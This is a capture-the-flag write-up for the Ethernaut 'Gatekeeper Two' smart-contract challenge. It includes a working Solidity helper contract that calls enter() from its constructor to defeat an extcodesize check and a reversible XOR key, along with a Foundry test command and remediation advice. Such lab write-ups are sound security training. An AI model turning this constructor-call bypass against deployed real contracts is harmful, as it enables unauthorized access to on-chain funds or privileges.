# Gatekeeper Two — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 15 — Gatekeeper Two](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-gatekeeper-two) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/GatekeeperTwo.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (broken access control) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`enter` is gated by three modifiers. Bypass all by deploying a helper that calls `enter` **inside its constructor**:

1. **gateOne** — helper is `msg.sender`, player is `tx.origin`.
2. **gateTwo** — during construction `extcodesize(helper) == 0`.
3. **gateThree** — key is the bitwise NOT of `uint64(bytes8(keccak256(abi.encodePacked(helper))))`.

`entrant` becomes `tx.origin` (the player).

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player is entrant | `gatekeeperTwoInstance.entrant() == player` |

---

## Findings

### [C-01] Construction-time code size is zero

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Flawed contract-detection |
| **Location** | `gateTwo` |

`extcodesize` is 0 while a contract is still being created. Calling `enter` from the constructor passes this check.

### [C-02] Key is XOR of caller hash

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Broken authentication |
| **Location** | `gateThree` |

```
key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max)
```

#### Proof of concept

```bash
cd web3-ctf-challenges/15-ethernaut-gatekeeper-two
forge test --match-test testExploit -vv
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    constructor(address target) {
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        );
        (bool ok,) = target.call(abi.encodeWithSignature("enter(bytes8)", key));
        require(ok, "enter failed");
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);
    new HelperContract(address(gatekeeperTwoInstance));
    vm.stopBroadcast();
}
```

---

## Remediation

Do not use `extcodesize` as an EOA check (breaks under construction / CREATE2 / EIP-7702 contexts). Do not treat hash/XOR puzzles as authorization.

---

## Key lessons

1. **`extcodesize == 0` ≠ EOA** during `constructor`
2. **XOR with `type(uint64).max`** is bitwise NOT — fully reversible
3. **gateOne + constructor** still satisfies `msg.sender != tx.origin`

---

## References

- [SCH Gatekeeper Two](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-gatekeeper-two)
- Local: `Exploit.s.sol`, `test/GatekeeperTwoExploit.t.sol`
